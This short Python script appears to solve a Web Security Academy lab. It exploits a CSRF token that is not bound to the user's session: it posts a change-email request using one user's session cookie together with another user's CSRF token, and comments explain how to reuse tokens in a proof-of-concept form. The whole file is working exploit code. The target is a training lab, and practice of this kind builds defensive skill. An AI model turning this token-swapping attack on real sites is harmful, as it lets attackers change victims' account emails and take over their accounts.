import requests
import re 

def get_csrf(text):
	csrf = re.findall(r'csrf" value="(.*)">', text)
	return csrf[0]	

s = requests.Session()
url = "https://0a4000c903f1cbcbc0ee29bd004d000f.web-security-academy.net/"

# Carlos's session
cookies = {
	"session": "yJ5by3qzyqzW6Nt0hCiuuGzeppfuDLEQ"
}

# Wiener's csrf
wiener_csrf = "h9QjZSCdsctKmHRarumuIDVtE1Ouw49L"
data = {
	"email": "test@test.com",
	"csrf": wiener_csrf
}

r = requests.post(url + "my-account/change-email", data=data, cookies=cookies)
print(r.text)

# CSRF token can be used only one time
# for POC form you have to get next csrf token from Wiener